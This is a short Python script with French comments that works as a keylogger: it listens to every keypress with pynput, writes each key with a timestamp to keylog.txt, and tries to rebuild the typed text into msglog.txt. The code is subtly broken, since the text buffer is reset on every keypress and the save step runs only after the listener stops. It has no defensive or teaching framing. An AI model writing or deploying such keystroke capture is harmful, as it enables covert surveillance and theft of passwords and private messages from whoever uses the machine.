import keyboard
import logging
import os
from pynput.keyboard import Key, Listener

# création du fichier de log et format des logs
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# ce que fait le programme lorsqu'on appuie sur une touche
def on_press(key):
    global tab
    tab = ""
    # ajout de la touche appuyé dans les logs et dans une variable pour la restitutition du msg
    match str(key):
        case "'a'":
            tab += str(key).replace("'", "")
        case '<96>':
            logging.info('0')
            tab += "0"
        case '<97>':
            logging.info('1')
            tab += "1"
        case '<98>':
            logging.info('2')
            tab += "2"
        case '<99>':
            logging.info('3')
            tab += "3"
        case '<100>':
            logging.info('4')
            tab += "4"
        case '<101>':
            logging.info('5')
            tab += "5"
        case '<102>':
            logging.info('6')
            tab += "6"
        case '<103>':
            logging.info('7')
            tab += "7"
        case '<104>':
            logging.info('8')
            tab += "8"    
        case '<105>':
            logging.info('9')
            tab += "9"
        case 'Key.enter':
            logging.info(str(key))
            tab += "\n"
        case 'Key.space':
            logging.info(str(key))
            tab += " "
        case 'Key.backspace':
            logging.info(str(key))
            tab = tab[:-1]
        case "['^']":
            logging.info('^')
            tab += '^'
        case "['¨']":
            logging.info('¨')
            tab += '¨'
        case "['~']":
            logging.info('~')
            tab += '~'
        case "['`']":
            logging.info('`')
            tab += '`'
        case "'a'"|"'b'"|"'c'"|"'d'"|"'e'"|"'f'"|"'g'"|"'h'"|"'i'"|"'j'"|"'k'"|"'l'"|"'m'"|"'n'"|"'o'"|"'p'"|"'q'"|"'r'"|"'s'"|"'t'"|"'u'"|"'v'"|"'w'"|"'x'"|"'y'"|"'z'":
            logging.info(str(key))
            tab += str(key).replace("'", "")
        case "'A'"|"'B'"|"'C'"|"'D'"|"'E'"|"'F'"|"'G'"|"'H'"|"'I'"|"'J'"|"'K'"|"'L'"|"'M'"|"'N'"|"'O'"|"'P'"|"'Q'"|"'R'"|"'S'"|"'T'"|"'U'"|"'V'"|"'W'"|"'X'"|"'Y'"|"'Z'":
            logging.info(str(key))
            tab += str(key).replace("'", "")
        case "'.'"|"'&'"|"'é'"|'"'|"'"|"'('"|"'-'"|"'è'"|"'_'"|"'ç'"|"'à'"|"')'"|"'='"|"'°'"|"'+'"|"'$'"|"'£'"|"'ù'"|"'%'"|"'*'"|"'µ'"|"','"|"'?'"|"';'"|"':'"|"'/'"|"'!'"|"'§'"|"'#'"|"'{'"|"'['"|"'|'"|"'\\'"|"'^'"|"'@'"|"']'"|"'}'":
            logging.info(str(key))
            tab += str(key).replace("'", "")
        case _:
            logging.info(str(key))
    
def msg_global():
    x=r'msglog.txt'
    if os.path.exists(x):
        if os.path.isfile(x):
            print("file already exists")
            f = open(x, "a")
    else:
        print("file is not existed and creating a new file")
        f = open(x,"w")

    f.write(tab)
    f.close()
    return


# listener sur l'action d'appuyer une touche
with Listener(on_press=on_press) as listener:
    listener.join()
    msg_global()